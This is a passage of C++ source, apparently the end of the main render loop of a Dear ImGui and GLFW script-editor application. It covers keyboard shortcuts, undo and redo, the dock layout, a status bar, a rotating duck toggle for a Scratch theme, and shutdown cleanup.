        if(ImGui::IsKeyChordPressed(ImGuiMod_Ctrl|ImGuiKey_S)||do_save){if(!g_Filename.empty()){SaveToFile(g_Filename);g_Dirty=false;}else g_SaveFileOpen=true;}
        if(ImGui::IsKeyChordPressed(ImGuiMod_Ctrl|ImGuiMod_Shift|ImGuiKey_S)||do_save_as)g_SaveFileOpen=true;
        if(ImGui::IsKeyChordPressed(ImGuiMod_Ctrl|ImGuiKey_Z)||do_undo){if(!g_UndoStack.empty()){g_RedoStack.push_back(g_Actions);g_Actions=g_UndoStack.back();g_UndoStack.pop_back();g_SelectedIndex=-1;g_Dirty=true;}}
        if(ImGui::IsKeyChordPressed(ImGuiMod_Ctrl|ImGuiKey_Y)||do_redo){if(!g_RedoStack.empty()){g_UndoStack.push_back(g_Actions);g_Actions=g_RedoStack.back();g_RedoStack.pop_back();g_SelectedIndex=-1;g_Dirty=true;}}
        if(ImGui::IsKeyChordPressed(ImGuiMod_Ctrl|ImGuiMod_Shift|ImGuiKey_C)||do_copy)ImGui::SetClipboardText(GenerateScript().c_str());
        if(ImGui::IsKeyPressed(ImGuiKey_F5)&&!g_ExecRunning)g_ExecOpen=true;
        if(do_template&&tidx>=0){PushUndo();g_Actions=g_Templates[tidx].actions;g_Filename.clear();g_SelectedIndex=-1;g_Dirty=true;}

        ShowOpenFileWindow();ShowSaveFileWindow();ShowEditWindow();ShowInputWindow();ShowExecuteWindow();ShowDocsWindow();

        ImGuiID dsid=ImGui::GetID("MainDockSpace");
        float sh=ImGui::GetFrameHeight()+ImGui::GetStyle().ItemSpacing.y*2;
        ImVec2 dsz=ImGui::GetContentRegionAvail();dsz.y-=sh;
        ImGui::DockSpace(dsid,dsz,ImGuiDockNodeFlags_None);

        static bool ff=true;if(ff){ff=false;ImGui::DockBuilderRemoveNode(dsid);ImGui::DockBuilderAddNode(dsid,ImGuiDockNodeFlags_None);
            ImGuiID dl,dc,dr;ImGui::DockBuilderSplitNode(dsid,ImGuiDir_Left,0.22f,&dl,&dc);
            ImGui::DockBuilderSplitNode(dc,ImGuiDir_Right,0.25f,&dr,&dc);
            ImGui::DockBuilderDockWindow("Palette",dl);ImGui::DockBuilderDockWindow("Canvas",dc);ImGui::DockBuilderDockWindow("Preview",dr);
            ImGui::DockBuilderFinish(dsid);}

        ImGui::Begin("Palette");ShowPalette();ImGui::End();
        ImGui::Begin("Canvas");if(g_ScratchTheme)ShowCanvasScratch();else ShowCanvas();ImGui::End();
        ImGui::Begin("Preview");ShowPreview();ImGui::End();

        ImGui::Separator();
        std::string st=std::to_string(g_Actions.size())+" actions";
        if(g_Dirty)st+="  |  Modified";if(!g_Filename.empty())st+="  |  "+g_Filename;
        ImGui::TextDisabled("%s",st.c_str());

        // Rotating duck — click to toggle Scratch theme
        ImGui::SameLine(ImGui::GetContentRegionAvail().x-28);
        ImVec2 duckPos=ImGui::GetCursorScreenPos();
        ImGui::InvisibleButton("##duck",ImVec2(24,24));
        if(ImGui::IsItemClicked())g_ScratchTheme=!g_ScratchTheme;
        if(ImGui::IsItemHovered())ImGui::SetTooltip(g_ScratchTheme?"Scratch Mode ON — click to disable":"Scratch Mode OFF — click to enable");
        float t=(float)ImGui::GetTime();
        float angle=sinf(t*2.7f)*0.3f;
        float ca=cosf(angle),sa=sinf(angle);
        ImDrawList*ddl=ImGui::GetWindowDrawList();
        ImVec2 dc=ImVec2(duckPos.x+12,duckPos.y+12);
        auto rot=[&](float rx,float ry)->ImVec2{return ImVec2(dc.x+rx*ca-ry*sa,dc.y+rx*sa+ry*ca);};
        float s=10.0f;
        if(g_DuckTex){
            ddl->AddImageQuad((ImTextureID)(intptr_t)g_DuckTex,
                rot(-s,-s),rot(s,-s),rot(s,s),rot(-s,s));
        }

        ImGui::End();
        ImGui::Render();
        if(g_TitleDragging){POINT cp;GetCursorPos(&cp);glfwSetWindowPos(w,g_TitleWinX+(cp.x-g_TitleStartX),g_TitleWinY+(cp.y-g_TitleStartY));}
        int dw,dh;glfwGetFramebufferSize(w,&dw,&dh);glViewport(0,0,dw,dh);
        glClearColor(0.02f,0.02f,0.03f,1.0f);glClear(GL_COLOR_BUFFER_BIT);
        ImGui_ImplOpenGL3_RenderDrawData(ImGui::GetDrawData());glfwSwapBuffers(w);
    }
    ImGui_ImplOpenGL3_Shutdown();ImGui_ImplGlfw_Shutdown();ImGui::DestroyContext();
    if(g_DuckTex)glDeleteTextures(1,&g_DuckTex);
    glfwDestroyWindow(w);glfwTerminate();return 0;
}
